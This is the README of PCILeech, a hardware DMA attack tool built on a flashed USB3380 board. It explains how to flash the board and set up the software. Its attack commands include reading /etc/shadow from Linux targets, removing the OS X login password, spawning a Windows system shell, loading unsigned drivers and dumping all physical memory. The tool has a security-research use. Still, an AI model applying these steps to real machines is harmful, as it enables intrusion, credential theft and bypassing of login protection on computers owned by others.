PCILeech Summary:
=================
The PCILeech use the USB3380 chip in order to read from and write to the memory of a target system. This is achieved by using DMA over PCI Express. No drivers are needed on the target system. The USB3380 is only able to read 4GB of memory natively, but is able to read all memory if a kernel module (KMD) is first inserted into the target system kernel. Reading 8GB of memory from the target system take around one (1) minute. The PCILeech hardware is connected with USB3 to a controlling computer running the PCILeech program.
PCILeech is also capable of inserting a wide range of kernel modules into the targeted kernels - allowing for pulling and pushing files, remove the logon password requirement, loading unsigned drivers, executing code and spawn system shells.
The software is written in visual studio and runs on Windows 7/Windows 10. Supported target systems are currently the x64 versions of: Linux, OS X and Windows.

Hardware:
=========
PCILeech is dependant on the PLX Technologies USB3380 chip. The actual chip can be purchased for around $15, but it's more convenient to purchase a development board on which the chip is already mounted. Development boards can be purchased from BPlus Technology, or on eBay / Ali Express.

http://www.bplus.com.tw/PLX.html

The hardware confirmed working is:
* USB3380-EVB mini-PCIe card. Including using PE3B (mPCIe 2 ExpressCard).
* PP3380-AB PCIe card. Including adapter to ExpressCard.
* Sonnet Echo ExpressCard Pro Thunderbolt to ExpressCard adapter.

Please note that the ExpressCard EC3380-AB is not working!

Flashing Hardware:
==================
In order to turn the USB3380 development board into a PCILeech device it needs to be flashed. The image to flash is found in pcileech_files and is named: firmware_pcileech.bin. In order to flash the image please download the PLX SDK from: http://www.plxtech.com/products/sdk/ (Linux version). You need to register to get access. The card must be connected to the Linux system doing the flashing via PCIe.

* unzip and untar
* export PLX_SDK_DIR=/pathtofiles/PlxSdk
* cd /pathtofiles/PlxSdk/PlxApi
* make
* cd ../Driver
* ./builddriver Svc
* ./Plx_load Svc

To load the firmware onto the USB3380-EVB mini PCIe card run:
* cd /pathtofiles/PlxSdk/Samples/PlxCm
* make
* ./App/PlxCm
* eep_load firmware_pcileech.bin

To load the firmware onto the PP3380 PCIe card run:

(the J3 jumper must be bridged to connect the EEPROM)
* cd Samples/PlxEep
* make
* ./App/PlxEep -w 2 -l firmware_pcileech.bin

Installing PCILeech:
====================
Please ensure you do have the most recent version of PCILeech by visiting the PCILeech github repository at: https://github.com/ufrisk/pcileech

Clone the PCILeech Github repository. The binaries are found in pcileech_files and should work on Windows 7 and Windows 10 64-bit versions. Please copy all files from pcileech_files since some files contains additional modules and signatures. 

The Google Android USB driver also needs to be installed. Download the Google Android USB driver from: http://developer.android.com/sdk/win-usb.html#download Unzip the driver. Open Device Manager. Right click on the computer, choose add legacy hardware. Select install the hardware manually. Click Have Disk. Navigate to the Android Driver, select android_winusb.inf and install. The PCILeech lies about being a Google Glass so that the Android USB driver may be used to access the PCILeech hardware from Windows.

Generating Signatures:
======================
PCILeech comes with built in signatures for Linux and OS X. For Windows 8.1 and higher two full pages of driver code is needed to hijack the kernel. In order to avoid copyright issues the end user has to generate these signatures by themselves using the pcileech_gensig.exe program. The user needs to point to a valid ntfs.sys file in order to generate a signature.

Capabilities:
=============
Users should be able to extend PCILeech easily by writing own kernel shellcode modules and/or creating custom signatures used to patch target system memory. Some of the current capabilies are listed below:
* Retrieve memory from the target system at >150MB/s. 
* Write data to the target system memory. 
* 4GB memory can be accessed in native DMA mode.
* ALL memory can be accessed if kernel module (KMD) is loaded.
* Execute kernel code on the target system.
* Spawn system shell [Windows].
* Spawn any executable [Windows].
* Load unsigned drivers [Windows].
* Pull files [Linux, Windows, OS X].
* Push files [Linux, Windows, OS X].
* Patch / Unlock (remove password requirement) [Windows, OS X].

Limitations/Known Issues:
=========================
* Read and write errors on some older hardware. Try "pcileech.exe testmemreadwrite -min 0x1000" in order to test memory reads and writes against the physical address 0x1000 (or any other address) in order to confirm.
* Does not work if the OS uses the IOMMU/VT-d. This is the default on OS X (unless disabled in recovery mode). Windows 10 Enterprise with Virtuallization based security features enabled does not work - this is however not the default setting in Windows 10.
* Some Linux kernels does not work. Sometimes a required symbol is not exported in the kernel and PCILeech fails.
* Linux might also not work if some virtualization based features are enabled.
* Windows Vista: some shellcode modules such as wx64_pscmd does not work.
* Windows 7: signatures are not published.

Examples:
=========
Load OS X kernel module:
* pcileech.exe kmdload -kmd osx_x64

Remove OS X password requirement, requires that the KMD is loaded at an address. In this example 0x11abc000 is used.
* pcileech.exe ax64_unlock -kmd 0x11abc000 -0 1

Retrieve the file /etc/shadow from a Linux system without pre-loading a KMD.
* pcileech.exe lx64_filepull -kmd LINUX_X64 -s /etc/shadow -out c:\temp\shadow

Load a kernel module into Windows Vista by using the default memory scan technique.
* pcileech.exe kmdload -kmd winvistax64

Load a kernel module into Windows 10 by targeting the page table of the ntfs.sys driver signed on 2016-03-29.
* pcileech.exe kmdload -kmd win10x64_ntfs_20160329 -pt

Spawn a system shell on the target system (system needs to be locked and kernel module must be loaded). In this example the kernel module is loaded at address: 0x7fffe000.
* pcileech.exe wx64_pscmd -kmd 0x7fffe000

Dump all memory from the target system given that a kernel module is loaded at address: 0x7fffe000.
* pcileech.exe dump -kmd 0x7fffe000

Building:
=========
The binaries are found in the pcileech_files folder. If one wish to build an own version it is possible to do so. Compile the pcileech and pcileech_gensig projects from within Visual Studio. Tested with Visual Studio 2015. To compile kernel- and shellcode, located in the pcileech_shellcode project, please look into the individual files for instructions. These files are usually compiled command line.

Changelog:
==========
v1.0
* Initial release.

latest
* New implant: load unsigned drivers into Windows kernel [wx64_driverload_svc].
